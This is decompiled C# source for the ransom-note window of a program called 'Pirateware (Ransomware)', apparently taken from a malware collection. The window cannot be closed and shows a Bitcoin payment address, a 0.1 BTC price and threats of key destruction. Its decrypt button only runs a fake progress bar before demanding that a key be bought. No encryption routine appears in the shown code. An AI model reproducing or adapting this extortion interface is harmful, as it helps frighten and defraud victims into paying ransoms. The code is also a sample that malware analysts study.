// Decompiled with JetBrains decompiler
// Type: First_Gui.Form1
// Assembly: First Gui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 40B33E92-4454-436D-9199-EC8DF301D264
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Ransomware\Pirate Ransomware\First Gui.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace First_Gui;

[DesignerGenerated]
public class Form1 : Form
{
  private IContainer components;

  public Form1()
  {
    this.Load += new EventHandler(this.Form1_Load);
    this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
    this.InitializeComponent();
  }

  private void CheckBox1_CheckedChanged(object sender, EventArgs e)
  {
  }

  private void Label1_Click(object sender, EventArgs e)
  {
  }

  private void PictureBox1_Click(object sender, EventArgs e)
  {
  }

  private void RichTextBox1_TextChanged(object sender, EventArgs e)
  {
  }

  private void PictureBox2_Click(object sender, EventArgs e)
  {
  }

  private void Timer1_Tick(object sender, EventArgs e)
  {
  }

  private void Form1_Load(object sender, EventArgs e)
  {
  }

  private void TextBox3_TextChanged(object sender, EventArgs e)
  {
  }

  private void Button1_Click(object sender, EventArgs e) => this.Timer1.Start();

  private void ProgressBar1_Click(object sender, EventArgs e) => this.ProgressBar1.Increment(1);

  private void Timer1_Tick_1(object sender, EventArgs e)
  {
    this.ProgressBar1.Increment(1);
    if (this.ProgressBar1.Value != this.ProgressBar1.Maximum)
      return;
    this.Timer1.Stop();
    int num = (int) Interaction.MsgBox((object) "Wrong key, remember you need to buy one to decrypt your files.", MsgBoxStyle.Critical, (object) "Buy a key!");
  }

  private void TextBox6_TextChanged(object sender, EventArgs e)
  {
  }

  private void Button2_Click(object sender, EventArgs e)
  {
    int num = (int) Interaction.MsgBox((object) "We will confirm purchase and send you a key, it will get confirmed as soon as possible.", MsgBoxStyle.Information, (object) "Confirming Purchase");
  }

  private void TextBox9_TextChanged(object sender, EventArgs e)
  {
  }

  private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
    this.Button1 = new Button();
    this.RichTextBox2 = new RichTextBox();
    this.TextBox1 = new TextBox();
    this.TextBox2 = new TextBox();
    this.TextBox3 = new TextBox();
    this.TextBox4 = new TextBox();
    this.TextBox5 = new TextBox();
    this.RichTextBox3 = new RichTextBox();
    this.ProgressBar1 = new ProgressBar();
    this.Timer1 = new Timer(this.components);
    this.TextBox7 = new TextBox();
    this.RichTextBox4 = new RichTextBox();
    this.TextBox6 = new TextBox();
    this.TextBox8 = new TextBox();
    this.Button2 = new Button();
    this.TextBox9 = new TextBox();
    this.TextBox10 = new TextBox();
    this.PictureBox1 = new PictureBox();
    this.TextBox11 = new TextBox();
    RichTextBox richTextBox = new RichTextBox();
    ((ISupportInitialize) this.PictureBox1).BeginInit();
    this.SuspendLayout();
    richTextBox.BackColor = Color.White;
    richTextBox.BorderStyle = BorderStyle.FixedSingle;
    richTextBox.Cursor = Cursors.Default;
    richTextBox.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    richTextBox.Location = new Point(512 /*0x0200*/, 72);
    richTextBox.Name = "RichTextBox1";
    richTextBox.ReadOnly = true;
    richTextBox.Size = new Size(601, 319);
    richTextBox.TabIndex = 1;
    richTextBox.Text = componentResourceManager.GetString("RichTextBox1.Text");
    richTextBox.TextChanged += new EventHandler(this.RichTextBox1_TextChanged);
    this.Button1.ForeColor = SystemColors.WindowText;
    this.Button1.Location = new Point(996, 487);
    this.Button1.Name = "Button1";
    this.Button1.Size = new Size(124, 34);
    this.Button1.TabIndex = 5;
    this.Button1.Text = "Decrypt Files";
    this.Button1.UseVisualStyleBackColor = true;
    this.RichTextBox2.Location = new Point(800, 497);
    this.RichTextBox2.Name = "RichTextBox2";
    this.RichTextBox2.Size = new Size(190, 20);
    this.RichTextBox2.TabIndex = 6;
    this.RichTextBox2.Text = "";
    this.TextBox1.BackColor = SystemColors.ControlDarkDark;
    this.TextBox1.BorderStyle = BorderStyle.None;
    this.TextBox1.Cursor = Cursors.Default;
    this.TextBox1.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox1.Location = new Point(804, 469);
    this.TextBox1.Name = "TextBox1";
    this.TextBox1.ReadOnly = true;
    this.TextBox1.Size = new Size(186, 22);
    this.TextBox1.TabIndex = 7;
    this.TextBox1.Text = "Enter Key";
    this.TextBox1.TextAlign = HorizontalAlignment.Center;
    this.TextBox2.BackColor = SystemColors.ControlDarkDark;
    this.TextBox2.BorderStyle = BorderStyle.None;
    this.TextBox2.Cursor = Cursors.Default;
    this.TextBox2.Font = new Font("Microsoft Sans Serif", 29.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox2.Location = new Point(487, 21);
    this.TextBox2.Name = "TextBox2";
    this.TextBox2.ReadOnly = true;
    this.TextBox2.ShortcutsEnabled = false;
    this.TextBox2.Size = new Size(608, 45);
    this.TextBox2.TabIndex = 8;
    this.TextBox2.Text = "What happend to my computer?";
    this.TextBox2.TextAlign = HorizontalAlignment.Center;
    this.TextBox3.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox3.Location = new Point(763, 434);
    this.TextBox3.Name = "TextBox3";
    this.TextBox3.ReadOnly = true;
    this.TextBox3.Size = new Size(357, 29);
    this.TextBox3.TabIndex = 9;
    this.TextBox3.Text = "34tfAnJsTbhJNCLnyurvPeTpqgGzobHLhL";
    this.TextBox3.TextAlign = HorizontalAlignment.Center;
    this.TextBox4.BackColor = SystemColors.ControlDarkDark;
    this.TextBox4.BorderStyle = BorderStyle.None;
    this.TextBox4.Cursor = Cursors.Default;
    this.TextBox4.Font = new Font("Microsoft Sans Serif", 20.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox4.Location = new Point(551, 397);
    this.TextBox4.Name = "TextBox4";
    this.TextBox4.ReadOnly = true;
    this.TextBox4.Size = new Size(739, 31 /*0x1F*/);
    this.TextBox4.TabIndex = 10;
    this.TextBox4.Text = "Send Bitcoins to this adress";
    this.TextBox4.TextAlign = HorizontalAlignment.Center;
    this.TextBox5.BackColor = SystemColors.ControlDarkDark;
    this.TextBox5.BorderStyle = BorderStyle.None;
    this.TextBox5.Cursor = Cursors.Default;
    this.TextBox5.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox5.Location = new Point(1, 350);
    this.TextBox5.Name = "TextBox5";
    this.TextBox5.ReadOnly = true;
    this.TextBox5.Size = new Size(264, 22);
    this.TextBox5.TabIndex = 11;
    this.TextBox5.Text = "Your bitcoin adress for contact:";
    this.RichTextBox3.Cursor = Cursors.IBeam;
    this.RichTextBox3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.RichTextBox3.Location = new Point(1, 378);
    this.RichTextBox3.Name = "RichTextBox3";
    this.RichTextBox3.ScrollBars = RichTextBoxScrollBars.None;
    this.RichTextBox3.Size = new Size(264, 22);
    this.RichTextBox3.TabIndex = 12;
    this.RichTextBox3.Text = "";
    this.ProgressBar1.Cursor = Cursors.No;
    this.ProgressBar1.Location = new Point(935, 527);
    this.ProgressBar1.Name = "ProgressBar1";
    this.ProgressBar1.Size = new Size(185, 23);
    this.ProgressBar1.TabIndex = 14;
    this.TextBox7.BackColor = SystemColors.ControlDarkDark;
    this.TextBox7.BorderStyle = BorderStyle.None;
    this.TextBox7.Cursor = Cursors.Default;
    this.TextBox7.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox7.ForeColor = Color.LimeGreen;
    this.TextBox7.Location = new Point(804, 526);
    this.TextBox7.Name = "TextBox7";
    this.TextBox7.ReadOnly = true;
    this.TextBox7.Size = new Size(129, 24);
    this.TextBox7.TabIndex = 15;
    this.TextBox7.Text = "Decrypting...";
    this.RichTextBox4.Location = new Point(1, 434);
    this.RichTextBox4.Name = "RichTextBox4";
    this.RichTextBox4.Size = new Size(264, 211);
    this.RichTextBox4.TabIndex = 16 /*0x10*/;
    this.RichTextBox4.Text = "";
    this.TextBox6.BackColor = SystemColors.ControlDarkDark;
    this.TextBox6.BorderStyle = BorderStyle.None;
    this.TextBox6.Cursor = Cursors.Default;
    this.TextBox6.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox6.Location = new Point(1, 406);
    this.TextBox6.Multiline = true;
    this.TextBox6.Name = "TextBox6";
    this.TextBox6.ReadOnly = true;
    this.TextBox6.Size = new Size(264, 31 /*0x1F*/);
    this.TextBox6.TabIndex = 17;
    this.TextBox6.Text = "Message:";
    this.TextBox8.BackColor = SystemColors.ControlDarkDark;
    this.TextBox8.BorderStyle = BorderStyle.None;
    this.TextBox8.Cursor = Cursors.Default;
    this.TextBox8.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox8.Location = new Point(1, 302);
    this.TextBox8.Multiline = true;
    this.TextBox8.Name = "TextBox8";
    this.TextBox8.ReadOnly = true;
    this.TextBox8.Size = new Size(331, 32 /*0x20*/);
    this.TextBox8.TabIndex = 18;
    this.TextBox8.Text = "Contact us directly here after purchase:";
    this.Button2.ForeColor = SystemColors.WindowText;
    this.Button2.Location = new Point(41, 665);
    this.Button2.Name = "Button2";
    this.Button2.Size = new Size(166, 32 /*0x20*/);
    this.Button2.TabIndex = 19;
    this.Button2.Text = "Submit Message";
    this.Button2.UseVisualStyleBackColor = true;
    this.TextBox9.BackColor = Color.Black;
    this.TextBox9.Cursor = Cursors.Default;
    this.TextBox9.Font = new Font("Microsoft Sans Serif", 30.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox9.ForeColor = Color.White;
    this.TextBox9.Location = new Point(326, 563);
    this.TextBox9.Multiline = true;
    this.TextBox9.Name = "TextBox9";
    this.TextBox9.ReadOnly = true;
    this.TextBox9.Size = new Size(788, 150);
    this.TextBox9.TabIndex = 20;
    this.TextBox9.Text = "Any attempt to corrupt or remove this software will result in immediate elimination of private key by the server.";
    this.TextBox10.BackColor = SystemColors.ControlDarkDark;
    this.TextBox10.BorderStyle = BorderStyle.None;
    this.TextBox10.Cursor = Cursors.Default;
    this.TextBox10.Font = new Font("Microsoft Sans Serif", 72f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox10.Location = new Point(326, 469);
    this.TextBox10.Multiline = true;
    this.TextBox10.Name = "TextBox10";
    this.TextBox10.ReadOnly = true;
    this.TextBox10.Size = new Size(468, 92);
    this.TextBox10.TabIndex = 21;
    this.TextBox10.Text = "Pirateware";
    this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
    this.PictureBox1.Location = new Point(-17, -74);
    this.PictureBox1.Name = "PictureBox1";
    this.PictureBox1.Size = new Size(523, 385);
    this.PictureBox1.TabIndex = 3;
    this.PictureBox1.TabStop = false;
    this.TextBox11.BackColor = Color.White;
    this.TextBox11.BorderStyle = BorderStyle.None;
    this.TextBox11.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.TextBox11.Location = new Point(517, 369);
    this.TextBox11.Name = "TextBox11";
    this.TextBox11.ReadOnly = true;
    this.TextBox11.Size = new Size(578, 22);
    this.TextBox11.TabIndex = 22;
    this.TextBox11.Text = "Price for key: 0.1 Bitcoins";
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.AutoValidate = AutoValidate.EnablePreventFocusChange;
    this.BackColor = SystemColors.ControlDarkDark;
    this.ClientSize = new Size(1125, 724);
    this.ControlBox = false;
    this.Controls.Add((Control) this.TextBox11);
    this.Controls.Add((Control) this.TextBox10);
    this.Controls.Add((Control) this.TextBox9);
    this.Controls.Add((Control) this.Button2);
    this.Controls.Add((Control) this.TextBox8);
    this.Controls.Add((Control) this.TextBox6);
    this.Controls.Add((Control) this.RichTextBox4);
    this.Controls.Add((Control) this.TextBox7);
    this.Controls.Add((Control) this.ProgressBar1);
    this.Controls.Add((Control) this.RichTextBox3);
    this.Controls.Add((Control) this.TextBox5);
    this.Controls.Add((Control) this.TextBox4);
    this.Controls.Add((Control) this.TextBox3);
    this.Controls.Add((Control) this.TextBox2);
    this.Controls.Add((Control) this.TextBox1);
    this.Controls.Add((Control) this.RichTextBox2);
    this.Controls.Add((Control) this.Button1);
    this.Controls.Add((Control) this.PictureBox1);
    this.Controls.Add((Control) richTextBox);
    this.ForeColor = Color.Black;
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.ImeMode = ImeMode.Off;
    this.Name = nameof (Form1);
    this.RightToLeft = RightToLeft.No;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Pirateware (Ransomware)";
    ((ISupportInitialize) this.PictureBox1).EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual Button Button1
  {
    get => this._Button1;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button1_Click);
      Button button1_1 = this._Button1;
      if (button1_1 != null)
        button1_1.Click -= eventHandler;
      this._Button1 = value;
      Button button1_2 = this._Button1;
      if (button1_2 == null)
        return;
      button1_2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("RichTextBox2")]
  internal virtual RichTextBox RichTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox1")]
  internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox2")]
  internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual TextBox TextBox3
  {
    get => this._TextBox3;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.TextBox3_TextChanged);
      TextBox textBox3_1 = this._TextBox3;
      if (textBox3_1 != null)
        textBox3_1.TextChanged -= eventHandler;
      this._TextBox3 = value;
      TextBox textBox3_2 = this._TextBox3;
      if (textBox3_2 == null)
        return;
      textBox3_2.TextChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TextBox4")]
  internal virtual TextBox TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox5")]
  internal virtual TextBox TextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("RichTextBox3")]
  internal virtual RichTextBox RichTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Timer Timer1
  {
    get => this._Timer1;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer1_Tick_1);
      Timer timer1_1 = this._Timer1;
      if (timer1_1 != null)
        timer1_1.Tick -= eventHandler;
      this._Timer1 = value;
      Timer timer1_2 = this._Timer1;
      if (timer1_2 == null)
        return;
      timer1_2.Tick += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TextBox7")]
  internal virtual TextBox TextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("RichTextBox4")]
  internal virtual RichTextBox RichTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual TextBox TextBox6
  {
    get => this._TextBox6;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.TextBox6_TextChanged);
      TextBox textBox6_1 = this._TextBox6;
      if (textBox6_1 != null)
        textBox6_1.TextChanged -= eventHandler;
      this._TextBox6 = value;
      TextBox textBox6_2 = this._TextBox6;
      if (textBox6_2 == null)
        return;
      textBox6_2.TextChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TextBox8")]
  internal virtual TextBox TextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Button Button2
  {
    get => this._Button2;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button2_Click);
      Button button2_1 = this._Button2;
      if (button2_1 != null)
        button2_1.Click -= eventHandler;
      this._Button2 = value;
      Button button2_2 = this._Button2;
      if (button2_2 == null)
        return;
      button2_2.Click += eventHandler;
    }
  }

  internal virtual TextBox TextBox9
  {
    get => this._TextBox9;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.TextBox9_TextChanged);
      TextBox textBox9_1 = this._TextBox9;
      if (textBox9_1 != null)
        textBox9_1.TextChanged -= eventHandler;
      this._TextBox9 = value;
      TextBox textBox9_2 = this._TextBox9;
      if (textBox9_2 == null)
        return;
      textBox9_2.TextChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TextBox10")]
  internal virtual TextBox TextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  protected virtual ProgressBar ProgressBar1
  {
    get => this._ProgressBar1;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.ProgressBar1_Click);
      ProgressBar progressBar1_1 = this._ProgressBar1;
      if (progressBar1_1 != null)
        progressBar1_1.Click -= eventHandler;
      this._ProgressBar1 = value;
      ProgressBar progressBar1_2 = this._ProgressBar1;
      if (progressBar1_2 == null)
        return;
      progressBar1_2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("PictureBox1")]
  internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox11")]
  internal virtual TextBox TextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
}
